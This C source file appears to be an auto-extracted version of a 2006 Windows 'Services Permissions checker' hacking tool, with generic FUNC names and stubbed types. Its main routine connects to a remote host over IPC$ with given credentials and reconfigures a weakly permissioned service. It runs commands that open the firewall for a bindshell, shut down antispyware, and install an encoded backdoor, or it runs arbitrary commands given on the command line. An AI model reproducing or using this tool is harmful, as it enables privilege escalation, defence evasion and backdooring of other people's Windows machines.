#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_3__   TYPE_1__ ;

/* Type definitions */
struct TYPE_3__ {char* lpRemoteName; int /*<<< orphan*/ * lpLocalName; int /*<<< orphan*/ * lpProvider; int /*<<< orphan*/  dwType; } ;
typedef  int /*<<< orphan*/  SERVICE_STATUS_PROCESS ;
typedef  int /*<<< orphan*/ * SC_HANDLE ;
typedef  TYPE_1__ NETRESOURCE ;
typedef  int DWORD ;
typedef  int /*<<< orphan*/  CurrentUserName ;

/* Variables and functions */
 scalar_t__ BACKDOOR ; 
 int /*<<< orphan*/  CONNECT_COMMANDLINE ; 
 int /*<<< orphan*/  CONNECT_UPDATE_PROFILE ; 
 int FUNC0 (int /*<<< orphan*/ *,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ,char*,int /*<<< orphan*/ *,int /*<<< orphan*/ *,char*,int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC1 (int /*<<< orphan*/ *) ; 
 scalar_t__ FUNC2 (int /*<<< orphan*/ *,int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 char* EncodedBackdoor ; 
 int FUNC3 () ; 
 int /*<<< orphan*/  FUNC4 (char*,int*) ; 
 int HELP ; 
 int LIST ; 
 int /*<<< orphan*/  FUNC5 (char*) ; 
 int NO_ERROR ; 
 int /*<<< orphan*/ * FUNC6 (char*,int /*<<< orphan*/ *,int) ; 
 int /*<<< orphan*/ * FUNC7 (int /*<<< orphan*/ *,char*,int) ; 
 int /*<<< orphan*/  RESOURCETYPE_ANY ; 
 char* RemoteHost ; 
 int /*<<< orphan*/  SERVICE_AUTO_START ; 
 int SERVICE_CHANGE_CONFIG ; 
 int /*<<< orphan*/  SERVICE_CONTROL_STOP ; 
 int /*<<< orphan*/  SERVICE_ERROR_IGNORE ; 
 int /*<<< orphan*/  SERVICE_NO_CHANGE ; 
 int SERVICE_START ; 
 int SERVICE_STOP ; 
 int STANDARD_RIGHTS_WRITE ; 
 int STOP ; 
 int /*<<< orphan*/  FUNC8 (int /*<<< orphan*/ *,char*,int) ; 
 int /*<<< orphan*/  TRUE ; 
 int FUNC9 (TYPE_1__*,char*,char*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC10 (char*,int /*<<< orphan*/ *,int /*<<< orphan*/ ) ; 
 char* antispyware ; 
 int /*<<< orphan*/  FUNC11 (int) ; 
 int /*<<< orphan*/  FUNC12 (int) ; 
 char* firewall ; 
 char* init ; 
 int /*<<< orphan*/  FUNC13 (char*,...) ; 
 int /*<<< orphan*/  FUNC14 (char*,char*,char*) ; 
 int /*<<< orphan*/ * FUNC15 (char*,char) ; 
 int FUNC16 (char*) ; 
 int /*<<< orphan*/  FUNC17 () ; 

int FUNC18(int argc, char* argv[]) {

 SC_HANDLE SCM,Svc;
 DWORD ret,len;
 char CurrentUserName[256];
 char *newPath=NULL;
 char *host=NULL;
 char *user=NULL;
 char *pass=NULL;
 char *srv=NULL;
 int i;
 NETRESOURCE NET;
  SERVICE_STATUS_PROCESS StopStatus;

 FUNC13(" Services Permissions checker v2.0\n");
 FUNC13(" (c) 2006 Andres Tarasco - atarasco%cgmail.com\n\n",'@');

 if (argc==1) FUNC17();
 for (i=1;i<argc;i++) {
    if ( (FUNC16(argv[i])==2) && (argv[i][0]=='-') ) {
        switch (argv[i][1]) {
            case 'l': LIST=1; break;
            case 'm': srv=argv[i+1]; i=i+1;break;
            case 'u': if (!host) FUNC17(); user=argv[i+1]; i=i++; break;
            case 'p': if (!host) FUNC17(); pass=argv[i+1]; i=i++; break;
            case 'H': host=argv[i+1]; i=i++; break;
            case 'c': newPath=argv[i+1]; i=i+1; BACKDOOR=0; break;
            case 's': STOP=1; break;
            case '?': HELP=1; FUNC17(); break;
            default: FUNC13("Unknown Parameter: %s\n",argv[i]);FUNC17(); break;
        }
    }
 }

 if ((!LIST) && (!srv) )FUNC17();

 if (host) { //InicializaciÃ³n.. ConexiÃ³n al sistema remoto..
    FUNC13("[+] Trying to connect to remote SCM\n");
    FUNC14(RemoteHost,"\\\\%s\\IPC$",host);
    FUNC13("[+] Host: %s\n",RemoteHost);
    FUNC13("[+] Username: %s\n",user);
    FUNC13("[+] Password: %s\n",pass);

    NET.dwType = RESOURCETYPE_ANY;
    NET.lpProvider = NULL;
    NET.lpLocalName=NULL;
    NET.lpRemoteName = (char *)RemoteHost;
    ret=FUNC9(&NET,pass,user,CONNECT_COMMANDLINE);//CONNECT_PROMPT);//CONNECT_UPDATE_PROFILE);

    //verificaciÃ³n de errores de conexiÃ³n...
    if ( (ret!=NO_ERROR) && (user !=NULL) ) {
        if (ret==1219) { //connection already created. Disconnecting..
            FUNC13("[-] Credentials mismatch. Removing old connection\n");
            FUNC10(RemoteHost,NULL,TRUE);
            ret=FUNC9(&NET,pass,user,CONNECT_UPDATE_PROFILE);
        } else {
            if (ret==1326) { //usuario o contraseÃ±a incorrecta
             if (FUNC15(user,'\\')==NULL) {
                 FUNC14(CurrentUserName,"localhost\\%s",user);
                FUNC13("[-] Unknown Username or password\n");
                FUNC13("[+] Trying \"%s\" as new username\n",CurrentUserName);
                ret=FUNC9(&NET,pass,CurrentUserName,CONNECT_UPDATE_PROFILE);
             }
            }
        }
        if (ret!=NO_ERROR) {
            FUNC13("WNetAddConnection Failed to %s (%s/ %s)\n",RemoteHost,user,pass);
            FUNC11(FUNC3());
            FUNC12(-1);
        }
    }
    FUNC13("[+] Network Connection OK\n");

 } else {
    FUNC13("[+] Trying to enumerate local resources\n");
    len=sizeof(CurrentUserName)-1;
    FUNC4(  CurrentUserName,&len);
    FUNC13("[+] Username: %s\n",CurrentUserName);
 }


if (LIST) {
    FUNC5(host);
    FUNC12(1);
}

//SERVICE HACKS HERE!!


SCM = FUNC6(host,NULL,STANDARD_RIGHTS_WRITE | SERVICE_START );
if (!SCM){
    FUNC13("[-] OpenScManager() FAILED\n");
    FUNC11(FUNC3());
    FUNC12(-1);
}
if (STOP) {
    Svc = FUNC7(SCM,srv,SERVICE_CHANGE_CONFIG | STANDARD_RIGHTS_WRITE | SERVICE_STOP);
} else {
    Svc = FUNC7(SCM,srv,SERVICE_CHANGE_CONFIG | STANDARD_RIGHTS_WRITE);
}

if (Svc==NULL) {
    FUNC13("[-] Unable to open Service %s\n",srv);
    FUNC12(-1);
}

//        printf("[+] Using leetz skillz to execute backdoor =)\n");

//Delete previous installed

if (STOP) {
 FUNC13("[+] Stopping previously running instances...\n");
 if (FUNC2(Svc,SERVICE_CONTROL_STOP,&StopStatus)!=0) {
    FUNC11(FUNC3());

 }
 FUNC12(-1);
}


 if (BACKDOOR) {
    FUNC13("[+] Uninstalling previous backdoors\n");
    ret=FUNC0(
        Svc,SERVICE_NO_CHANGE,SERVICE_AUTO_START,
        SERVICE_ERROR_IGNORE,init,NULL,NULL,"",
        NULL,NULL,NULL);

        if (ret!=0) FUNC8(SCM,srv,0);

    FUNC13("[+] Granting Remote bindshell Execution..\n");
    ret=FUNC0(
        Svc,SERVICE_NO_CHANGE,SERVICE_AUTO_START,
        SERVICE_ERROR_IGNORE,firewall,NULL,NULL,"",
        NULL,NULL,NULL);
        if (ret!=0) FUNC8(SCM,srv,0);
    FUNC13("[+] Shutting down remote antispyware Service =)\n");
    ret=FUNC0(
        Svc,SERVICE_NO_CHANGE,SERVICE_AUTO_START,
        SERVICE_ERROR_IGNORE,antispyware,NULL,NULL,"",
        NULL,NULL,NULL);
        if (ret!=0) FUNC8(SCM,srv,0);
    FUNC13("[+] Installing Backdoor Code...\n");
    ret=FUNC0(
        Svc,SERVICE_NO_CHANGE,SERVICE_AUTO_START,
        SERVICE_ERROR_IGNORE,EncodedBackdoor,NULL,NULL,"",
        NULL,NULL,NULL);
 } else { //Ejecutando parametros especificados con -c
    FUNC13("[+] Sending custom commands to the service\n");
    ret=FUNC0(
        Svc,SERVICE_NO_CHANGE,SERVICE_AUTO_START,
        SERVICE_ERROR_IGNORE,newPath,NULL,NULL,"",
        NULL,NULL,NULL);
 }

 if (ret!=0) {
    FUNC13("[+] The service have been succesfully modified =)\n");
    FUNC1(Svc);
    FUNC8(SCM,srv,1);
 } else {
    FUNC13("[-] Service modification Failed\n");
    FUNC11(ret);
 }
 FUNC1(SCM);
 if (host) FUNC10(RemoteHost,NULL,TRUE);
 return(1);
}